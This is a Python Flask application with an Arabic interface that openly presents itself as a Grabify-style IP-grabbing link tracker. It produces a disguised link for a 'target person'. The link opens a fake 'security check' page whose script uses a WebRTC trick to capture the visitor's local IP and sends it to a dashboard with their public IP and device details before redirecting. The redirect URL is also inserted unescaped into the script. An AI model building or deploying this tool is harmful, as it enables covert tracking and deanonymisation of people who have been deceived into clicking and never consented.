from flask import Flask, render_template_string, request, redirect, jsonify
import uuid
import datetime

app = Flask(__name__)

# قاعدة بيانات مؤقتة في الذاكرة لحفظ الروابط والنقرات
links_db = {}

# تصميم بسيط، أنيق ومباشر شبيه بـ Grabify ومناسب لشاشة الهاتف
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مختصر الروابط الذكي</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background-color: #2c3e50; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
        .container { max-width: 550px; margin: 25px auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
        h2 { color: #2c3e50; font-size: 20px; text-align: center; margin-bottom: 20px; }
        label { font-weight: bold; display: block; margin-top: 15px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
        button { width: 100%; background-color: #3498db; color: white; border: none; padding: 14px; margin-top: 20px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #2980b9; }
        .card { background: #f8f9fa; padding: 15px; border-right: 5px solid #3498db; border-radius: 4px; margin-top: 15px; word-break: break-all; }
        .stats-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
        .stats-table th, .stats-table td { border: 1px solid #ddd; padding: 10px; text-align: center; }
        .stats-table th { background-color: #2c3e50; color: white; }
        .badge { background: #e74c3c; color: white; padding: 2px 8px; border-radius: 4px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="navbar">لوحة تحكم الروابط والتتبع الذكي</div>
    <div class="container">
        {% if page == 'home' %}
            <h2>إنشاء رابط تتبع جديد (Grabify Style)</h2>
            <form action="/create" method="POST">
                <label>الرابط المستهدف الأصلي للتوجيه:</label>
                <input type="url" name="original_url" placeholder="https://youtube.com/watch?v=..." required>
                
                <label>اكتب ملاحظة لكي لا تنسى (تظهر لك فقط):</label>
                <input type="text" name="note" placeholder="مثال: تجربة تتبع جهاز صديقي" required>
                
                <button type="submit">إنشاء الرابط</button>
            </form>
        {% elif page == 'created' %}
            <h2>تم إنشاء الرابط وتجهيزه!</h2>
            <p><strong>الملاحظة المحفوظة:</strong> <span style="color:#e67e22; font-weight:bold;">{{ link_data.note }}</span></p>
            
            <div class="card">
                <strong>🔗 رابط التمويه (أرسله للشخص المستهدف):</strong><br>
                <input type="text" value="{{ tracking_link }}" style="width:100%; padding:8px; margin-top:5px; font-size:13px;" readonly>
            </div>
            
            <div class="card" style="border-right-color: #2ecc71;">
                <strong>📊 رابط الإحصائيات الفورية والـ IP:</strong><br>
                <input type="text" value="{{ stats_link }}" style="width:100%; padding:8px; margin-top:5px; font-size:13px;" readonly>
            </div>
            <a href="/" style="display:block; text-align:center; margin-top:20px; color:#3498db; text-decoration:none; font-weight:bold;">← إنشاء رابط جديد</a>
        {% elif page == 'stats' %}
            <h2>إحصائيات الرابط وبيانات الأجهزة</h2>
            <p><strong>الملاحظة:</strong> <span style="color:#e67e22; font-weight:bold;">{{ link_data.note }}</span></p>
            <p><strong>عدد النقرات:</strong> <span class="badge">{{ link_data.clicks|length }}</span></p>
            
            {% if link_data.clicks %}
                <div style="overflow-x:auto;">
                    <table class="stats-table">
                        <thead>
                            <tr>
                                <th>الوقت</th>
                                <th>الـ IP العام (من الإنترنت)</th>
                                <th>الـ IP المحلي (الداخلي للشبكة)</th>
                                <th>تفاصيل نظام الجهاز</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for click in link_data.clicks %}
                            <tr>
                                <td>{{ click.time }}</td>
                                <td style="color:#e74c3c; font-weight:bold;">{{ click.ip }}</td>
                                <td style="color:#27ae60; font-weight:bold;">{{ click.local_ip }}</td>
                                <td style="font-size:11px; text-align:left;">{{ click.device }}</td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            {% else %}
                <p style="color:#999; text-align:center;">لا توجد زيارات مسجلة حتى الآن.</p>
            {% endif %}
            <br>
            <a href="/" style="display:block; text-align:center; color:#3498db; text-decoration:none; font-weight:bold;">← العودة للرئيسية</a>
        {% endif %}
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_LAYOUT, page='home')

@app.route('/create', methods=['POST'])
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note')
    link_id = str(uuid.uuid4())[:8]
    
    links_db[link_id] = {
        'url': original_url,
        'note': note,
        'clicks': []
    }
    
    tracking_link = f"{request.host_url}secure/{link_id}"
    stats_link = f"{request.host_url}dashboard/{link_id}"
    
    return render_template_string(HTML_LAYOUT, page='created', tracking_link=tracking_link, stats_link=stats_link, link_data=links_db[link_id])

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    if link_id in links_db:
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>جاري الفحص والأمان...</title>
            <script>
                function getLocalIPAndRedirect() {{
                    var localIp = "غير قادر على استخراجه (VPN/محمي)";
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    
                    if (window.RTCPeerConnection) {{
                        var pc = new RTCPeerConnection({{iceServers:[]}}), noop = function(){{}};
                        pc.createDataChannel("");
                        pc.createOffer(pc.setLocalDescription.bind(pc), noop);
                        pc.onicecandidate = function(ice) {{
                            if (ice && ice.candidate && ice.candidate.candidate) {{
                                var myIP = /([0-9]{{1,3}}(\\\\.[0-9]{{1,3}}){{3}})/.exec(ice.candidate.candidate);
                                if (myIP) {{
                                    localIp = myIP[1];
                                    sendData(localIp);
                                    pc.onicecandidate = noop;
                                }}
                            }}
                        }};
                        setTimeout(function() {{ sendData(localIp); }}, 900);
                    }} else {{
                        sendData(localIp);
                    }}
                }}

                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{
                            window.location.href = "{links_db[link_id]['url']}";
                        }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                window.onload = getLocalIPAndRedirect;
            </script>
        </head>
        <body>
            <p style="text-align:center; font-family:sans-serif; margin-top:100px; color:#666;">جاري تحميل المحتوى البصري الفيديوي بأمان، يرجى الانتظار...</p>
        </body>
        </html>
        '''
    return "الرابط غير موجود", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    if link_id in links_db:
        data = request.get_json() or {}
        local_ip = data.get('local_ip', 'غير معروف')
        
        # جلب الـ IP العام الفعلي للزائر عبر خوادم الاستضافة
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
            
        user_agent = request.headers.get('User-Agent')
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        links_db[link_id]['clicks'].append({
            "ip": ip_address,
            "local_ip": local_ip,
            "device": user_agent,
            "time": current_time
        })
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 404

@app.route('/dashboard/<link_id>')
def dashboard(link_id):
    if link_id in links_db:
        return render_template_string(HTML_LAYOUT, page='stats', link_data=links_db[link_id])
    return "المعرف غير صحيح", 404

if __name__ == '__main__':
    app.run(debug=True)
